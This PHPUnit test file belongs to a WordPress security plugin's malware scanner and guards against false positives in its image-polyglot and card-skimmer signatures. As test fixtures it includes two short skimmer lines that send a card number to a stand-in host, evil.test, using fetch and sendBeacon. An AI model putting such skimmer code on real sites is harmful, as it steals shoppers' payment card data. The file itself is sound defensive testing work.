<?php
declare(strict_types=1);

namespace DPXL\Shield\Tests\Unit\Scanner;

use DPXL\Shield\Scanner\MalwareScanner;
use DPXL\Shield\Scanner\SignatureDatabase;
use PHPUnit\Framework\TestCase;

/**
 * The three detections that called ordinary WordPress installs compromised.
 *
 * Each sample below is the real thing: files taken from a live site that the
 * scanner reported as critical malware. A regression here does not produce a
 * stray log line — it floods the admin with critical alerts until they stop
 * reading them, which is the failure mode a security plugin cannot afford.
 */
class FalsePositiveGuardsTest extends TestCase {

    // ── sig-php-in-img: written for images, was running on PHP ─────────────

    /**
     * A GIF-parsing library. Its namespace and header comment say "Gif", which
     * is what the old unanchored pattern matched.
     */
    public function testGifLibrarySourceIsNotFlagged(): void {
        $php = "<?php\n\nnamespace DynamicOOOS\\Mpdf\\Gif;\n\n/**\n * GIF Util - (C) 2003 Yamasoft\n */\nclass ColorTable {}\n";

        $this->assertNull((new SignatureDatabase())->match($php, 'php'));
    }

    /** WordPress core: an opening tag followed by a path to a .png. */
    public function testWordPressCoreMediaFileIsNotFlagged(): void {
        $php = "<?php echo esc_url( admin_url( 'images/no.png' ) ); ?>";

        $this->assertNull((new SignatureDatabase())->match($php, 'php'));
    }

    /**
     * The actual threat: a real GIF carrying PHP in its header.
     *
     * The payload is deliberately inert (`echo 1`) so that only the polyglot
     * signature can fire — a payload that is malicious in its own right would
     * be caught by the shell-exec signature instead and prove nothing about
     * this one.
     */
    public function testPolyglotImageIsStillFlagged(): void {
        $polyglot = "GIF89a" . str_repeat("\x00", 24) . '<?php echo 1; ?>';

        $hit = (new SignatureDatabase())->match($polyglot, 'gif');

        $this->assertNotNull($hit);
        $this->assertSame('sig-php-in-img', $hit['id']);
    }

    public function testCleanImageIsNotFlagged(): void {
        $gif = "GIF89a" . str_repeat("\x07", 4096);

        $this->assertNull((new SignatureDatabase())->match($gif, 'gif'));
    }

    /**
     * Scope is enforced, not merely hinted: the same bytes that trip the
     * signature as a .gif must not trip it as a .php.
     */
    public function testImageSignatureDoesNotRunOnPhpFiles(): void {
        $bytes = "GIF89a" . str_repeat("\x00", 24) . '<?php echo 1; ?>';

        $this->assertNotNull((new SignatureDatabase())->match($bytes, 'gif'));
        $this->assertNull((new SignatureDatabase())->match($bytes, 'php'));
    }

    // ── sig-skimmer-js: three substrings, anywhere, used to suffice ─────────

    /** @param mixed ...$args */
    private function skimmer(string $content): bool {
        $m = new \ReflectionMethod(MalwareScanner::class, 'hasSkimmerProximity');
        $m->setAccessible(true);

        return (bool) $m->invoke(null, $content);
    }

    /**
     * A form-builder bundle: it legitimately contains a card-field name and a
     * network call, 670 KB apart. Previously that was a "critical skimmer".
     */
    public function testFormLibraryBundleIsNotFlagged(): void {
        $bundle = 'var x=1;' . str_repeat('/*pad*/', 60000)
            . 'XMLHttpRequest' . str_repeat('/*pad*/', 60000)
            . 'credit_card' . str_repeat('/*pad*/', 60000) . 'fetch(';

        $this->assertFalse($this->skimmer($bundle));
    }

    /** A real skimmer reads the field and ships it immediately. */
    public function testRealSkimmerIsStillFlagged(): void {
        $skimmer = "var n=document.getElementById('card_number').value;fetch('https://evil.test/c?d='+n);";

        $this->assertTrue($this->skimmer($skimmer));
    }

    /** The send may precede the read. */
    public function testSkimmerDetectedInEitherOrder(): void {
        $reversed = "navigator.sendBeacon('https://evil.test/x', document.forms[0].cardnumber.value);";

        $this->assertTrue($this->skimmer($reversed));
    }

    /** Either ingredient alone is just ordinary code. */
    public function testIngredientsAloneAreNotFlagged(): void {
        $this->assertFalse($this->skimmer('fetch("https://api.example.com/items");'));
        $this->assertFalse($this->skimmer('const label = "credit_card";'));
    }
}
